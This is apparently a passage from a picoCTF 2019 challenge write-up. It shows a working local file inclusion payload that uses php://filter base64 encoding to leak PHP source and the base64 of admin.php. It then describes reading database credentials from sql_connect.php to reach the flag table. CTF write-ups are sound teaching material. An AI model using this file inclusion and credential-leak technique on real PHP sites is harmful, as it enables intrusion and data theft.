
By checking different value for ``file``, it seems combine the parameters with ``.php`` suffix as the argument for inclusion. But the content of the files aren't directly accessible. How about ```php://filter``.


```
https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=admin
```
It print a long base64-encoded string. By decoding it we have the ``admin.php`` file.

```
base64 -d <<< PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg== > admin.php
```


The file depends on another one, ``cookie.php``.
```
require_once('cookie.php');
```

Fetch ``https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=cookie`` and decode, we found the SQL to verify admin login in ``cookie.php`` and another file ``sql_connect.php``.

From ``sql_connect`` we got the database credentials. Connect to mysql server from shell server, the flag is in ``pico_ch2``.``users`` table. 
